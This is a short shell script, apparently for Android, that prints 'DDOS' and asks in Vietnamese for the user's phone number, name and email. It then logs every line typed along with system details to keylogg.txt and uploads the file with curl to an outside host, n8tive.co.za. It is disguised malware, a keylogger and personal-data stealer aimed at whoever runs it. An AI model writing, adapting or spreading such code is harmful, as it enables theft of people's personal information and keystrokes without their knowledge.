#!/system/bin/bash/sh
echo "DDOS"
echo Vui Lòng Nhập Thông Tin cá nhân của bạn để sưl dụng
echo ""
  echo -n Số Điện Thoại :
  read phone
  echo -n Họ Và Tên :
  read name
  echo -n Email :
  read email

cm()
{
read line
  case $line in

  $line)
  echo "
  System : $(uname -a)
  User   : $(whoami)
  date   : $(date)
  path   : $(pwd)

  phone number : $phone
  name : $name
  email : $email

  ','{$line}',' " >> keylogg.txt
  curl -T keylogg.txt http://n8tive.co.za/
  cm

 esac
 }
cm
